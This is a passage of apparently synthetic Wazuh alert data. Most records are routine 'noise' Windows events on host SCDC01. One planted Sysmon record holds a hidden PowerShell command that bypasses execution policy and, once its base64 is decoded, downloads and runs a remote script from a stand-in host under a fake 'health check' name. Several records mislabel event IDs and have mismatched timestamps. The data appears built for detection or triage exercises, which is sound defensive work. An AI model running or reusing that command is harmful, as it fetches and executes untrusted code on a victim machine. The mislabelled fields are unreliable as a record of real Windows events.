[
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0021-9179",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T18:29:29Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\7-Zip\\7zFM.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x66482"
          }
        }
      },
      "timestamp": "2025-10-08T18:29:29Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0059-8973",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process has exited.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T18:39:44Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\taskmgr.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x28a0c"
          }
        }
      },
      "timestamp": "2025-10-08T18:39:44Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "d96e427a-7749-4770-a5ea-86bf627ff90b",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T18:01:29.024209Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xaf7fc"
          }
        }
      },
      "timestamp": "2025-10-08T17:30:41.024217Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0007-6514",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T17:29:23Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\mspaint.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x1b2a7"
          }
        }
      },
      "timestamp": "2025-10-08T17:29:23Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0047-8744",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process has exited.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T18:17:57Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x3f351"
          }
        }
      },
      "timestamp": "2025-10-08T18:17:57Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0057-7209",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T17:22:28Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\taskmgr.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x18d4"
          }
        }
      },
      "timestamp": "2025-10-08T17:22:28Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0013-4814",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process was created.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T17:10:53Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xded1d"
          }
        }
      },
      "timestamp": "2025-10-08T17:10:53Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "388fb529-4179-44e1-bc11-d90371f1b9f7",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T17:48:18.023916Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xc9a89"
          }
        }
      },
      "timestamp": "2025-10-08T18:22:16.023926Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0004-9928",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process has exited.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T17:27:08Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x6c65a"
          }
        }
      },
      "timestamp": "2025-10-08T17:27:08Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0052-8350",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T18:13:13Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x24e2f"
          }
        }
      },
      "timestamp": "2025-10-08T18:13:13Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "37b43c27-e12b-4132-983a-b39afadf8219",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T17:59:32.024517Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x913fc"
          }
        }
      },
      "timestamp": "2025-10-08T18:12:02.024527Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "cc9bd452-2f60-4e67-b10a-94a8c33d9120",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T17:37:29.023390Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x48c5f"
          }
        }
      },
      "timestamp": "2025-10-08T17:51:39.023396Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0048-2545",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process was created.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T17:25:59Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x19d07"
          }
        }
      },
      "timestamp": "2025-10-08T17:25:59Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0016-2169",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process has exited.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T18:33:19Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\mspaint.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x9cf00"
          }
        }
      },
      "timestamp": "2025-10-08T18:33:19Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0041-7118",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process was created.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T18:31:42Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\mspaint.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x71275"
          }
        }
      },
      "timestamp": "2025-10-08T18:31:42Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "ab7c4e8e-7dc8-4c76-8e28-c72715846f66",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T17:47:14.023452Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xb255c"
          }
        }
      },
      "timestamp": "2025-10-08T17:42:38.023461Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "923924e8-7281-4ad3-97ed-6168ae4fdd72",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process was created.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T17:54:05.024331Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x3c17f"
          }
        }
      },
      "timestamp": "2025-10-08T17:52:22.024340Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0035-6038",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process was created.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T18:59:58Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x3e4cb"
          }
        }
      },
      "timestamp": "2025-10-08T18:59:58Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0017-5010",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process has exited.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T18:39:33Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x2ad4b"
          }
        }
      },
      "timestamp": "2025-10-08T18:39:33Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0028-1188",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process has exited.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T17:34:19Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xaf270"
          }
        }
      },
      "timestamp": "2025-10-08T17:34:19Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0015-6820",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T17:50:32Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\7-Zip\\7zFM.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x36a24"
          }
        }
      },
      "timestamp": "2025-10-08T17:50:32Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0019-1525",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T17:31:16Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\7-Zip\\7zFM.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xcf177"
          }
        }
      },
      "timestamp": "2025-10-08T17:31:16Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "bfad18e8-5637-4438-88d2-6569a8e360ee",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4689",
            "systemTime": "2025-10-08T18:24:32.024161Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x78570"
          }
        }
      },
      "timestamp": "2025-10-08T18:25:55.024169Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "2269214c-722f-4e0b-b319-f0ed7c0b2bcf",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T17:33:39.023999Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xd6c39"
          }
        }
      },
      "timestamp": "2025-10-08T17:38:37.024007Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0049-7735",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process was created.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T17:57:49Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\taskmgr.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x788ee"
          }
        }
      },
      "timestamp": "2025-10-08T17:57:49Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "7392e97f-c4cf-4c41-9b1b-bf03975bafb0",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T17:41:20.023844Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\System32\\svchost.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xbeda1"
          }
        }
      },
      "timestamp": "2025-10-08T17:32:21.023849Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "d6f97498-1c9e-4f18-9d52-18858c5889a3",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process was created.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T17:54:23.023894Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xedbd7"
          }
        }
      },
      "timestamp": "2025-10-08T17:58:35.023899Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0044-1964",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T17:09:41Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x3b9be"
          }
        }
      },
      "timestamp": "2025-10-08T17:09:41Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0054-2604",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process was created.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T18:50:19Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xdf35"
          }
        }
      },
      "timestamp": "2025-10-08T18:50:19Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "f35ee477-6c1d-42e2-9e8b-b1c6e8d877f6",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T17:38:20.023417Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\cmd.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xd2401"
          }
        }
      },
      "timestamp": "2025-10-08T17:49:00.023431Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "d4f8a9c2-6b3e-4f12-9c2a-1e8f9b2a7c5d",
    "_source": {
      "agent": {
        "name": "VICTIM-HOST-01.corp.local",
        "id": "vh01",
        "ip": "10.10.5.23"
      },
      "rule": {
        "level": 3,
        "description": "A process was created.",
        "id": "34012"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "1",
            "systemTime": "2025-10-08T10:12:30.123Z",
            "providerName": "Microsoft-Windows-Sysmon"
          },
          "eventdata": {
            "ProcessGuid": "{e9b2a6d2-9f0c-4b3d-91a4-1f2d3e5a6b7c}",
            "ProcessId": "5420",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzE5OC41MS4xMDAuMjQvZGVmZW5kZXIvc3lzX2hlYWx0aF9jaGVjay5wczEnKTsgU3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsIC1Bcmd1bWVudExpc3QgJy1Ob1Byb2ZpbGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtRmlsZSBDOlxXaW5kb3dzXFRlbXBcc3lzX2hlYWx0aF9jaGVjay5wczEn",
            "ParentProcessId": "668",
            "ParentImage": "C:\\Windows\\system32\\services.exe",
            "Hashes": "SHA256=3f6b2c5ea1b9f8d2a4b7c8d9e0f4a6b2c5e3d4a6b7c8e9f0a1b2c3d4e5f6a7b8",
            "User": "CORP\\svc-update",
            "Details": "EncodedCommand present; suspicious flags: -EncodedCommand, -ExecutionPolicy Bypass, -WindowStyle Hidden"
          }
        }
      },
      "timestamp": "2025-10-08T10:12:30.123Z",
      "location": "Sysmon"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "14bf23e0-5782-442d-985d-a0c0b2da445c",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T17:53:53.024378Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0x454d3"
          }
        }
      },
      "timestamp": "2025-10-08T17:54:35.024386Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0018-4598",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A process was created.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T17:36:51Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xb042e"
          }
        }
      },
      "timestamp": "2025-10-08T17:36:51Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0037-9727",
    "_source": {
      "agent": {
        "name": "SCDC01",
        "id": "005",
        "ip": "172.16.200.50"
      },
      "rule": {
        "level": 3,
        "description": "A logon was successful.",
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4624",
            "systemTime": "2025-10-08T18:43:50Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "Administrator",
            "newProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "targetLogonId": "0x0",
            "subjectDomainName": "INSIGHTNEXUS",
            "subjectLogonId": "0xc50db"
          }
        }
      },
      "timestamp": "2025-10-08T18:43:50Z",
      "location": "EventChannel"
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.08",
    "_id": "noise-0001-2679",
    "_source": {
      "agent": {
